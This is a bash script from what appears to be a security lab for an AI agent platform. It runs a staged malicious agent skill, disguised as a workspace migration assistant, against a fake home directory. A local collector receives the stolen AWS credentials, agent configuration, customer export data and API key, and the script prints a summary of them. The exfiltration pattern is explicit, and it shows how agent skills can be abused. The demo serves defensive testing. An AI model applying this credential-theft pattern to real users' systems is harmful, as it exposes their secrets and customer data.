#!/usr/bin/env bash

set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck disable=SC1091
source "${ROOT_DIR}/scripts/lab-env.sh"

DEMO_DIR="${ROOT_DIR}/.demo-state"
DEMO_HOME="${DEMO_DIR}/fake-home"
EXPORT_PATH="${DEMO_DIR}/workspace-export.json"
REPORT_PATH="${ROOT_DIR}/reports/skill-exfil-demo.json"
SKILL_ENTRY="${OPENCLAW_SKILLS_DIR}/workspace-migration-assistant/collect_snapshot.py"
PORT="${OPENCLAW_DEMO_PORT}"
COLLECTOR_PID=""
PYTHON_BIN="${ROOT_DIR}/.venv/bin/python"

if [ ! -x "${PYTHON_BIN}" ]; then
  PYTHON_BIN="$(command -v python3)"
fi

cleanup() {
  if [ -n "${COLLECTOR_PID}" ] && kill -0 "${COLLECTOR_PID}" >/dev/null 2>&1; then
    kill "${COLLECTOR_PID}" >/dev/null 2>&1 || true
    wait "${COLLECTOR_PID}" 2>/dev/null || true
  fi
}

trap cleanup EXIT

rm -f "${REPORT_PATH}"

"${ROOT_DIR}/scripts/prepare_live_demo.sh" >/dev/null

if [ ! -f "${SKILL_ENTRY}" ]; then
  echo "🚨 Malicious skill is not available in ${OPENCLAW_SKILLS_DIR}." >&2
  echo "If you just quarantined it, this is the expected result." >&2
  echo "To stage it again for another test, run ./scripts/install_malicious_skill.sh." >&2
  exit 1
fi

"${PYTHON_BIN}" "${ROOT_DIR}/scripts/local_exfil_collector.py" \
  --port "${PORT}" \
  --output "${REPORT_PATH}" \
  --one-shot &
COLLECTOR_PID=$!

"${PYTHON_BIN}" - <<PY
import socket
import time

for _ in range(30):
    try:
        with socket.create_connection(("127.0.0.1", ${PORT}), timeout=0.2):
            break
    except OSError:
        time.sleep(0.1)
else:
    raise SystemExit("Local collector did not start in time.")
PY

OPENCLAW_TELEMETRY_URL="http://127.0.0.1:${PORT}/skill" \
OPENCLAW_AWS_CREDENTIALS_PATH="${DEMO_HOME}/.aws/credentials" \
OPENCLAW_CONFIG_PREVIEW_PATH="${DEMO_HOME}/.openclaw/openclaw.json" \
OPENCLAW_CUSTOMER_EXPORT_PATH="${OPENCLAW_WORKSPACE}/data/customer_rollout.csv" \
LLM_API_KEY="demo-migration-token" \
"${PYTHON_BIN}" "${SKILL_ENTRY}" "${EXPORT_PATH}"

wait "${COLLECTOR_PID}"
COLLECTOR_PID=""

REPORT_PATH_ENV="${REPORT_PATH}" "${PYTHON_BIN}" - <<'PY'
import json
import os
from pathlib import Path

report_path = Path(os.environ["REPORT_PATH_ENV"])
record = json.loads(report_path.read_text())
payload = record["fields"].get("report_json", {})

summary = {
    "collector_path": record["path"],
    "aws_credentials_path": payload.get("aws_credentials_path"),
    "aws_credentials": payload.get("aws_credentials"),
    "customer_export_path": payload.get("customer_export_path"),
    "customer_export_preview": payload.get("customer_export_preview"),
    "config_preview": payload.get("config_preview"),
    "uploaded_bundle": record["files"].get("support_bundle", {}),
}
print(json.dumps(summary, indent=2))
PY
